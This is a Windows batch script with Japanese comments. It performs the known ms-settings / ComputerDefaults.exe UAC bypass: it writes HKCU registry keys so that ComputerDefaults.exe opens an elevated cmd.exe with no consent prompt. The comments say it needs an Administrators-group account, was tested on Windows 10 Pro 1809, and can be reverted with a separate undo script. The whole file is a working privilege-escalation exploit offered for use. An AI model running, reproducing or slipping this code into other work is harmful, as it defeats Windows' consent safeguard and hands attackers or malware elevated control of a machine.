@echo off

rem UACの確認無しで権限昇格できます
rem 実行するユーザーはAdministratorsグループに属している必要があります

rem これを実行した後、一部不具合が出る可能性があるので、
rem Elevate_undo.batを実行して元に戻しておいたほうがいいと思います（そこは個人の自由）

rem Windows 10 Pro 1809(17763.437)にて動作確認

reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /ve /t REG_SZ /d "%SYSTEMROOT%\System32\cmd.exe" /f
%SYSTEMROOT%\System32\ComputerDefaults.exe